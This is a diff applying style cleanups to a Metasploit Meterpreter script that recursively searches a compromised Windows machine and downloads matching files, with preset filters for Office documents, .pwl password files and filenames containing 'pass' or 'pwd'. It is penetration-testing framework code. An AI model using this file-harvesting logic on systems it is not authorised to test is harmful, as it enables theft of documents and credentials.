@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 ## Meterpreter script that recursively search and download
 ## files matching a given pattern
@@ -19,11 +19,11 @@
 $filters = {
   'office' => '\.(doc|docx|ppt|pptx|pps|xls|xlsx|mdb|od.)$',
   'win9x'  => '\.pwl$',
-  'passwd' => '(pass|pwd)',
+  'passwd' => '(pass|pwd)'
 }
 
 @@opts = Rex::Parser::Arguments.new(
-  "-h" => [ false,"Help menu." ]
+  "-h" => [ false, "Help menu." ]
 )
 
 def usage
@@ -32,7 +32,7 @@ def usage
   print_line
   print_line "filter can be a defined pattern or 'free', in which case pattern must be given"
   print_line "Defined patterns:"
-  print_line $filters.keys.sort.collect{|k| "\t#{k}"}.join("\n")
+  print_line $filters.keys.sort.collect { |k| "\t#{k}" }.join("\n")
   print_line
   print_line "Examples:"
   print_line " run search_dwld"
@@ -45,22 +45,22 @@ def usage
   raise Rex::Script::Completed
 end
 
-@@opts.parse(args) { |opt, idx, val|
+@@opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     usage
   end
-}
+end
 
 def scan(path)
   begin
     dirs = client.fs.dir.foreach(path)
   rescue ::Rex::Post::Meterpreter::RequestError => e
-    print_error("Error scanning #{path}: #{$!}")
+    print_error("Error scanning #{path}: #{$ERROR_INFO}")
     return
   end
 
-  dirs.each {|x|
+  dirs.each do |x|
     next if x =~ /^(\.|\.\.)$/
     fullpath = path + '\\' + x
 
@@ -73,15 +73,14 @@ def scan(path)
       print_line("Downloading '#{fullpath}' to '#{dst}'")
       client.fs.file.download_file(dst, fullpath)
     end
-  }
+  end
 end
 
-#check for proper Meterpreter Platform
+# check for proper Meterpreter Platform
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-
 
 unsupported if client.platform !~ /win32|win64/i
 # Get arguments
@@ -90,18 +89,13 @@ filter  = args[1] || "office"
 
 # Set the regexp
 if filter == 'free'
-  if args[2].nil?
-    raise RuntimeError.new("free filter requires pattern argument")
-  end
+  raise "free filter requires pattern argument" if args[2].nil?
   $motif = args[2]
 else
   $motif = $filters[filter]
 end
 
-if $motif.nil?
-  raise RuntimeError.new("Unrecognized filter")
-end
+raise "Unrecognized filter" if $motif.nil?
 
 # Search and download
 scan(basedir)
-
